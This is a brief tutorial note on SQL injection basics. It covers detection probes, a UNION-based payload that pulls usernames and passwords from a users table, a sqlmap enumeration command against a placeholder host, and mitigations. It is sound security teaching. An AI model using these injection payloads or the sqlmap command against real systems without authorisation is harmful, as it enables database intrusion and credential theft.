---
title: "SQL Injection Basics"
description: "Core concepts of SQL injection, from detection to classic UNION-based extraction."
category: "Web Pentest"
tags: ["sql-injection", "web", "burp-suite"]
date: "2026-01-15"
---

## What is SQL Injection?

SQL Injection (SQLi) happens when user-controlled input is inserted into a
SQL query without proper sanitization, allowing an attacker to alter the
query's logic. It remains one of the most common and highest-impact web
vulnerabilities.

## Detecting SQLi

Start with simple probes in every input field, URL parameter, and header:

```text
'
"
' OR '1'='1
' OR SLEEP(5)--
```

If the app throws a database error, behaves differently, or delays its
response, you likely have an injection point.

## A Classic UNION-Based Example

Suppose a product page uses a query like this:

```sql
SELECT name, price, description
FROM products
WHERE id = '$id';
```

If `$id` is unsanitized, you can break out of the string and inject your own
`UNION SELECT`:

```sql
' UNION SELECT username, password, NULL FROM users--
```

## Automating with SQLmap

Once you've confirmed manual injection, SQLmap can speed up enumeration:

```bash
sqlmap -u "https://target.com/product?id=1" \
  --batch \
  --dbs \
  --risk=2 \
  --level=3
```

> **Note:** Always prefer manual verification before automating - it teaches
> you *why* the injection works, not just *that* it works.

## Mitigation

- Use parameterized queries / prepared statements
- Apply least-privilege database accounts
- Validate and allow-list input where possible

## Related

See also the [PortSwigger labs note](/notes/portswigger-sqli-labs) for
lab-specific payloads.
